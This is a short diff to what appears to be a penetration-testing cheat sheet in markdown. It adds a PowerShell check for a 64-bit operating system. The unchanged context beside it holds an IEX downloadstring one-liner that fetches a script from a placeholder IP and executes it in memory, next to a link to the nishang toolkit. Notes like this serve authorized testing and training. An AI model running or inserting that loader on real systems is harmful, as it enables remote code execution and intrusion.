@@ -781,6 +781,7 @@ C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe
 - powershell  
   [nishang](https://github.com/samratashok/nishang)
 ```powershell
+[Environment]::Is64BitOperatingSystem
 [Environment]::Is64BitProcess
 IEX(new-object net.webclient).downloadstring('http://IP/.ps1')
 ```
